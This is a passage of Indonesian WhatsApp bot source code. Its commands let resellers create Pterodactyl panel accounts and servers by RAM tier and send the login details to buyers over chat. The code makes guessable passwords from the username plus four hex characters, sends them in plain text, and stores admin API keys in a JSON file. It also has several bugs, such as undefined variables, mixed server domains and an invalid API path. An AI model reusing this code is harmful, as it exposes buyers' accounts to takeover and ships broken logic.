                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 10GB\",\"title\":\"Create\",\"id\":\".cp10gbv5\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *Unlimited*
* CPU Server *Unlimited*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+botname2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram Unlimited\",\"title\":\"Create\",\"id\":\".cpunliv5\"}"
                  }
                ]
              })
            }
          ]
        })
      })
    }
  }
}, {userJid: m.sender, quoted: qtoko})


await TamaMods.relayMessage(msgii.key.remoteJid, msgii.message, {
  messageId: msgii.key.id
})
}
break
//------(Batas Case)------//
case 'setppbot': {
if (!isCreator) return Reply(mess.owner)
if (!quoted) return Reply(`Kirim/kutip gambar dengan caption ${prefix+command}`)
if (!/image/.test(mime)) return Reply(`Kirim/kutip gambar dengan caption ${prefix+command}`)
if (/webp/.test(mime)) return Reply(`Kirim/kutip gambar dengan caption ${prefix+command}`)
let media = await TamaMods.downloadAndSaveMediaMessage(quoted)
await TamaMods.updateProfilePicture(botNumber, { url: media }).catch((err) => fs.unlinkSync(media))
Reply('Sukses mengganti pp bot!')
}
break
//------(Batas Case)------//
case "addaksesgrub": case "addaksesgc": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
const input = m.chat
if (seller.includes(input)) return Reply(`Grup ini sudah di beri akses reseller panel!`)
seller.push(input)
await fs.writeFileSync("./Access/database/reseller.json", JSON.stringify(seller, null, 2))
Reply(`Berhasil menambah grup reseller panel ✅`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listaksesgrub": case "listaksesgc": {
if (seller.length < 1) return Reply("Tidak ada user reseller")
let teks = `\n *乂 List all grup reseller panel*\n`
for (let i of seller) {
let name = (await TamaMods.groupMetadata(i)).subject || "Tidak ditemukan"
teks += `\n* ${i}
* *Nama :* ${name}\n`
}
TamaMods.sendMessage(m.chat, {text: teks, mentions: []}, {quoted: pantek})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delaksesgrub": case "delaksesgc": {
if (!isCreator) return Reply(mess.owner)
if (seller.length < 1) return Reply("Tidak ada grup reseller panel")
if (!text) {
let list = []
for (let i of seller) {
let name = (await TamaMods.groupMetadata(i)).subject || "Tidak ditemukan"
list.push({
title: `${name}`, 
description: i, 
id: `.${command} ${i}`
})
}
list.push({
title: `All Group Reseller`, 
description: "All group reseller", 
id: `.${command} all`
})
return TamaMods.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Server',
          sections: [
            {
              title: `List All Server`,
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Salah Satu Server\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: pantek})
}
let input = text
if (text == "all") {
await seller.splice(0, seller.length)
await fs.writeFileSync("./Access/database/reseller.json", JSON.stringify(seller, null, 2))
return Reply(`Berhasil menghapus semua grup reseller panel ✅`)
}
if (!seller.includes(input)) return Reply(`Grup ini bukan grup reseller panel!`)
let posi = seller.indexOf(input)
await seller.splice(posi, 1)
await fs.writeFileSync("./Access/database/reseller.json", JSON.stringify(seller, null, 2))
Reply(`Berhasil menghapus grup reseller panel ✅`)
}
break
//------(Batas Case)------//
case "addserverpanel": case "addserver": {
if (!isCreator) return Reply(mess.owner)
if (!text) return Reply(example(`domain(contoh TamaMods.com)|egg(contoh 15)|nestid(contoh 5)|locid(contoh 1)|ptla|ptlc`))
if (!text.split("|")) return Reply(example(`domain(contoh TamaMods.com)|egg(contoh 15)|nestid(contoh 5)|locid(contoh 1)|ptla|ptlc`))
let dt = text.split('|')
if (dt.length < 6) return Reply(example(`domain(contoh TamaMods.com)|egg(contoh 15)|nestid(contoh 5)|locid(contoh 1)|ptla|ptlc`))
let [dom, eg, nest, locc, ptla, ptlc] = dt
const natalia = {
"domain": `https://${dom}`, 
"egg": eg, 
"nestid": nest, 
"loc": loc, 
"apikey": ptla, 
"capikey": ptlc
}
serverpanel.push(natalia)
await fs.writeFileSync("./System/settingpanel.json", JSON.stringify(serverpanel, null, 2))
Reply(`Berhasil menambah server panel *${dom}*`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listserverpanel": {
if (!isCreator) return Reply(mess.owner)
if (serverpanel.length < 1) return Reply("Tidak ada server panel")
let tt = 0
let teks = "\n *── List all server panel*\n"
await serverpanel.forEach(e => teks += `\n* ${tt += 1}. ${e.domain.split("https://")[1]}\n`)
Reply(`${teks}`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delserverpanel": case "delserver": {
if (!isCreator) return Reply(mess.owner)
if (serverpanel.length < 1) return Reply("Tidak ada server panel")
if (!args[0]) {
let list = []
let v = 0
for (let i of serverpanel) {
list.push({
title: `${i.domain.split("https://")[1]}`, 
id: `.${command} ${v += 1}`
})
}

list.push({
title: `All Server Panel`,
id: `.${command} all`
})

return TamaMods.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Server',
          sections: [
            {
              title: `List All Server`,
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Salah Satu Server\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: pantek})
}
if (!text) return Reply(example("server\n\nuntuk melihat list server ketik *.listserver*\ncontoh *.delserver* 2"))
if (args[0] == "all") {
await serverpanel.splice(0, serverpanel.length)
await fs.writeFileSync("./System/settingpanel.json", JSON.stringify(serverpanel, null, 2))
return Reply(`Berhasil menghapus semua server panel`)
}
if (Number(text) > serverpanel.length) return Reply("Server panel tidak ditemukan")
let dom = serverpanel[Number(text) - 1].domain
await serverpanel.splice((Number(text) - 1), 1)
await fs.writeFileSync("./System/settingpanel.json", JSON.stringify(serverpanel, null, 2))
Reply(`Berhasil menghapus server panel *${dom.split("https://")[1]}*`)
}
break
//------(Batas Case)------//
case "cpanel-v2": {
if (!isCreator && !isSellerr) return Reply(mess.seller2)
if (!q) return Reply(example("username"));
    global.panel = [text.toLowerCase()]
let teks = `Pilih Ram Panel Dibawah ini`
const sections = [{
	    	title: '𝑻𝒂𝒎𝒂 </> 𝑺𝒖𝒑𝒆𝒓𝒊𝒐𝒓',
	    	highlight_label: "🎭꙳͙͡༑ᐧ ̬𝑺𝒊𝒎𝒑𝒍𝒆 𝑩𝒐𝒕 𝑽𝟐̬꙳͙͡༑ᐧ〽️",
	    	rows: [{
	    		title: "1GB SERVER 2", description: "Create Ram 1GB", id: ".1gb2"
	    	}]
	    }, {	    	
	    	rows: [{
	    		title: "2GB SERVER 2", description: "Create Ram 2GB", id: ".2gb2"
	    	}, {
	    		title: "3GB SERVER 2", description: "Create Ram 3GB", id: ".3gb2"
	    	},
	    	{
	    		title: "4GB SERVER 2", description: "Create Ram 4GB", id: ".4gb2"
	    	},
	    	{
	    		title: "5GB SERVER 2", description: "Create Ram 5GB", id: ".5gb2"
	    	},
	    	{
	    		title: "6GB SERVER 2", description: "Create Ram 6GB", id: ".6gb2"
	    	},
	    	{
	    		title: "7GB SERVER 2", description: "Create Ram 7GB", id: ".7gb2"
	    	},
	    	{
	    		title: "8GB SERVER 2", description: "Create Ram 8GB", id: ".8gb2"
	    	},
	    	{
	    		title: "9GB SERVER 2", description: "Create Ram 9GB", id: ".9gb2"
	    	},
	    	{
	    		title: "10GB SERVER 2", description: "Create Ram 10GB", id: ".10gb2"
	    	},
	    	{
	    		title: "UNLIMITED SERVER 2", description: "Create Ram Unlimited", id: ".unli2"
	    	}]
	    }]
	    
	    let listMessage = {
	    	title: "options",
	    	sections
	    }

const Vyunicos = [
{ buttonId: '.menu', buttonText: { displayText: '𝐂𝐨𝐫𝐞˚𝐒𝐲𝐬𝐭𝐞𝐦', }, type: 1, nativeFlowInfo: { name: 'single_select', paramsJson: JSON.stringify(listMessage), }, viewOnce: true, }
                ]
                
                TamaMods.sendMessage(m.chat, {
                	    image: { url: "https://files.catbox.moe/wbl5er.jpg" },
                	    caption: teks,
                    	footer: global.footer,
                    	buttons: Vyunicos,
                	    headerType: 1,
                	    viewOnce: true,
                    }, { quoted: pantek })
}
break  

case "1gb1": case "2gb1": case "3gb1": case "4gb1": case "5gb1": case "6gb1": case "7gb1": case "8gb1": case "9gb1": case "10gb1": case "unlimited1": case "unli1": {
if (!isCreator && !isSeller) return Reply(mess.seller)
if (global.panel == undefined) return Reply('Username tidak ditemukan!')
var ram
var disknya
var cpu

if (command == "1gb1") {
    ram = "1000";
    disknya = "1000";
    cpu = "40";
} else if (command == "2gb1") {
    ram = "2000";
    disknya = "1000";
    cpu = "60";
} else if (command == "3gb1") {
    ram = "3000";
    disknya = "2000";
    cpu = "80";
} else if (command == "4gb1") {
    ram = "4000";
    disknya = "2000";
    cpu = "100";
} else if (command == "5gb1") {
    ram = "5000";
    disknya = "3000";
    cpu = "120";
} else if (command == "6gb1") {
    ram = "6000";
    disknya = "3000";
    cpu = "140";
} else if (command == "7gb1") {
    ram = "7000";
    disknya = "4000";
    cpu = "160";
} else if (command == "8gb1") {
    ram = "8000";
    disknya = "4000";
    cpu = "180";
} else if (command == "9gb1") {
    ram = "9000";
    disknya = "5000";
    cpu = "200";
} else if (command == "10gb1") {
    ram = "10000";
    disknya = "5000";
    cpu = "220";
} else {
    ram = "0";
    disknya = "0";
    cpu = "0";
}

let username = global.panel[0].toLowerCase()
let email = username + "@gmail.com";
let name = capital(username) + " Server";
let password = username + crypto.randomBytes(2).toString('hex');

// Sisa kode tetap sama seperti semula...
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return Reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let usr_id = user.id
let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return Reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await Reply("*Succes Created Akun Panel*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `*Data Akun Panel Anda*

*Succesfully Create Akun Panel*

*BERIKUT DETAIL AKUN PANEL ANDA*

* *ID SERVER :* ${user.id}
* *NAMA :* ${name}
* *USERNAME :* ${user.username}
* *PASSWORD :* ${password}
* *LINK LOGIN :* ${global.domain}


*Rules Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari
* dilarang membagikan link login 
* dilarang ddos panel terimakasih
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await TamaMods.sendMessage(orang, {text: teks}, {quoted: pantek})
delete global.panel
}
break
//------(Batas Case)------//
case "1gb2": case "2gb2": case "3gb2": case "4gb2": case "5gb2": case "6gb2": case "7gb2": case "8gb2": case "9gb2": case "10gb2": case "unlimited2": case "unli2": {
if (!isCreator && !isSellerr) return Reply(mess.seller2)
if (global.panel == undefined) return Reply('Username tidak ditemukan!')
var ram
var disknya
var cpu

if (command == "1gb2") {
    ram = "1000";
    disknya = "1000";
    cpu = "40";
} else if (command == "2gb2") {
    ram = "2000";
    disknya = "1000";
    cpu = "60";
} else if (command == "3gb2") {
    ram = "3000";
    disknya = "2000";
    cpu = "80";
} else if (command == "4gb2") {
    ram = "4000";
    disknya = "2000";
    cpu = "100";
} else if (command == "5gb2") {
    ram = "5000";
    disknya = "3000";
    cpu = "120";
} else if (command == "6gb2") {
    ram = "6000";
    disknya = "3000";
    cpu = "140";
} else if (command == "7gb2") {
    ram = "7000";
    disknya = "4000";
    cpu = "160";
} else if (command == "8gb2") {
    ram = "8000";
    disknya = "4000";
    cpu = "180";
} else if (command == "9gb2") {
    ram = "9000";
    disknya = "5000";
    cpu = "200";
} else if (command == "10gb2") {
    ram = "10000";
    disknya = "5000";
    cpu = "220";
} else {
    ram = "0";
    disknya = "0";
    cpu = "0";
}

let username = global.panel[0].toLowerCase()
let email = username + "@gmail.com";
let name = capital(username) + " Server";
let password = username + crypto.randomBytes(2).toString('hex');

// Sisa kode tetap sama seperti semula...
let f = await fetch(domainV2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return Reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let usr_id = user.id
let f1 = await fetch(domainV2 + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domainV2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
},
"body": JSON.stringify({
"name": name,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return Reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await Reply("*Succesfully Created Akun Panel*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `*Data Akun Panel Anda*

*Succesfully Create Akun Panel Server 2*

*BERIKUT DETAIL AKUN PANEL ANDA*

* *ID SERVER :* ${user.id}
* *NAMA :* ${name}
* *USERNAME :* ${user.username}
* *PASSWORD :* ${password}
* *LINK LOGIN :* ${global.domainV2}


*Rules Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari
* dilarang membagikan link login 
* dilarang ddos panel terimakasih
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await TamaMods.sendMessage(orang, {text: teks}, {quoted: pantek})
delete global.panel
}
break
//------(Batas Case)------//
case "c1gb": {
    if (!isCreator && !isSeller) return Reply(mess.seller)

let t = text.split(',');
if (t.length < 2) return Reply(`*Format salah!*
Penggunaan:
${prefix+command} user,nomer`)
var ceknya = text.split(",")[1]
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
var check = await TamaMods.onWhatsApp(ceknya)
if (!check[0].exists) return Reply("Nomor Target Tidak Valid!")
let name = capital(username) + " Server"
let egg = global.egg
let loc = global.loc
let memo = "1024"
let cpu = "40"
let disk = "1024"
let email = username + "1398@gmail.com"
akunlo = "https://files.catbox.moe/wbl5er.jpg" 
if (!u) return
let d = (await TamaMods.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return Reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
Reply(`*Succesfully Created Akun Panel*\n*Data Akun Sudah Dikirim Ke nomor ${ceknya}*
*crate user + server id :* ${user.id}`)
ctf = `*Data Akun Panel Anda*

*Succesfully Create Akun Panel*

*BERIKUT DETAIL AKUN PANEL ANDA*

* *ID SERVER :* ${user.id}
* *NAMA :* ${name}
* *USERNAME :* ${user.username}
* *PASSWORD :* ${password}
* *LINK LOGIN :* ${global.domain}


*Rules Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari
* dilarang membagikan link login 
* dilarang ddos panel terimakasih
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
TamaMods.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: TamaMods.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return Reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
}

break
//----------(Batas Case)----------//
case "c1gb-v2": {
if (!isCreator && !isSellerr) return Reply(mess.seller2)
let t = text.split(',');
if (t.length < 2) return Reply(`*Format salah!*
Penggunaan:
${prefix+command} user,nomer`)
var ceknya = text.split(",")[1]
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
var check = await TamaMods.onWhatsApp(ceknya)
if (!check[0].exists) return Reply("Nomor Target Tidak Valid!")
let name = capital(username) + " Server"
let egg = global.eggV2
let loc = global.locV2
let memo = "1024"
let cpu = "40"
let disk = "1024"
let email = username + "1398@gmail.com"
akunlo = "https://files.catbox.moe/wbl5er.jpg" 
if (!u) return
let d = (await TamaMods.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return Reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nestsV2/5/eggsV2/" + eggV2, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
Reply(`*Berhasil Membuat Akun Panel*\n*Data Akun Sudah Dikirim Ke nomor ${ceknya}*
*crate user + server id :* ${user.id}`)
ctf = `*Data Akun Panel Anda*

*Succes Create Akun Panel Server 2*

*BERIKUT DETAIL AKUN PANEL ANDA*

* *ID SERVER :* ${user.id}
* *NAMA :* ${name}
* *USERNAME :* ${user.username}
* *PASSWORD :* ${password}
* *LINK LOGIN :* ${global.domainV2}


*Rules Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari
* dilarang membagikan link login 
* dilarang ddos panel terimakasih
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
TamaMods.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: TamaMods.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domainV2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
},
"body": JSON.stringify({
"name": name,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(locV2)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return Reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
}

break
//----------(Batas Case)----------//
case "c2gb": {
    if (!isCreator && !isSeller) return Reply(mess.seller)

let t = text.split(',');
if (t.length < 2) return Reply(`*Format salah!*
Penggunaan:
${prefix+command} user,nomer`)
var ceknya = text.split(",")[1]
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
var check = await TamaMods.onWhatsApp(ceknya)
if (!check[0].exists) return Reply("Nomor Target Tidak Valid!")
let name = capital(username) + " Server"
let egg = global.egg
let loc = global.loc
let memo = "2024"
let cpu = "60"
let disk = "2024"
let email = username + "1398@gmail.com"
akunlo = "https://files.catbox.moe/wbl5er.jpg" 
if (!u) return
let d = (await TamaMods.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return Reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
Reply(`*Berhasil Membuat Akun Panel*\n*Data Akun Sudah Dikirim Ke nomor ${ceknya}*
*crate user + server id :* ${user.id}`)
ctf = `*Data Akun Panel Anda*

*Succesfully Create Akun Panel*

*BERIKUT DETAIL AKUN PANEL ANDA*

* *ID SERVER :* ${user.id}
* *NAMA :* ${name}
* *USERNAME :* ${user.username}
* *PASSWORD :* ${password}
* *LINK LOGIN :* ${global.domain}


*Rules Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari
* dilarang membagikan link login 
* dilarang ddos panel terimakasih
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
TamaMods.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: TamaMods.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return Reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
}

break
//----------(Batas Case)----------//
case "c2gb-v2": {
if (!isCreator && !isSellerr) return Reply(mess.seller2)
let t = text.split(',');
if (t.length < 2) return Reply(`*Format salah!*
Penggunaan:
${prefix+command} user,nomer`)
var ceknya = text.split(",")[1]
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
var check = await TamaMods.onWhatsApp(ceknya)
if (!check[0].exists) return Reply("Nomor Target Tidak Valid!")
let name = capital(username) + " Server"
let egg = global.eggV2
let loc = global.locV2
let memo = "2024"
let cpu = "60"
let disk = "2024"
let email = username + "1398@gmail.com"
akunlo = "https://files.catbox.moe/wbl5er.jpg" 
if (!u) return
let d = (await TamaMods.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return Reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nestsV2/5/eggsV2/" + eggV2, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
Reply(`*Berhasil Membuat Akun Panel*\n*Data Akun Sudah Dikirim Ke nomor ${ceknya}*
*crate user + server id :* ${user.id}`)
ctf = `*Data Akun Panel Anda*

*Succes Create Akun Panel Server 2*

*BERIKUT DETAIL AKUN PANEL ANDA*

* *ID SERVER :* ${user.id}
* *NAMA :* ${name}
* *USERNAME :* ${user.username}
* *PASSWORD :* ${password}
* *LINK LOGIN :* ${global.domainV2}


*Rules Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari
* dilarang membagikan link login 
* dilarang ddos panel terimakasih
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
TamaMods.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: TamaMods.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domainV2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
},
"body": JSON.stringify({
"name": name,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(locV2)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return Reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
}

break
//----------(Batas Case)----------//
case "c3gb": {
if (!isCreator && !isSeller) return Reply(mess.seller)
let t = text.split(',');
if (t.length < 2) return Reply(`*Format salah!*
Penggunaan:
${prefix+command} user,nomer`)
var ceknya = text.split(",")[1]
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
